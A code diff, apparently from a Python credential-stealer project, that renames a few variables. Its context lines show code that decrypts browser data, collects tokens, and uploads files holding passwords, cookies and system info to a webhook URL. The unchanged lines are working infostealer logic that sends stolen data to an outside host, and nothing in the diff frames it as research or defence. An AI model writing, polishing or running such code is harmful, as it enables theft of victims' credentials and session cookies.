@@ -242,7 +242,7 @@ def post_to(file):
         post(webhook_url, files={'files': open(file, 'rb')})
 
 
-forHandler = (
+for_handler = (
     fileInfo,
     filePass,
     fileCookies,
@@ -251,7 +251,7 @@ forHandler = (
 )
 
 
-def fileHandler(file):
+def file_handler(file):
     if os.path.exists(file):
         if ".txt" in file:
             post_to(file)
@@ -262,8 +262,8 @@ def main():
     for name, path in browser_loc.items():
         decrypt_files(path, name)
     main_tokens()
-    for i in forHandler:
-        fileHandler(i)
+    for i in for_handler:
+        file_handler(i)
 
 
 main()
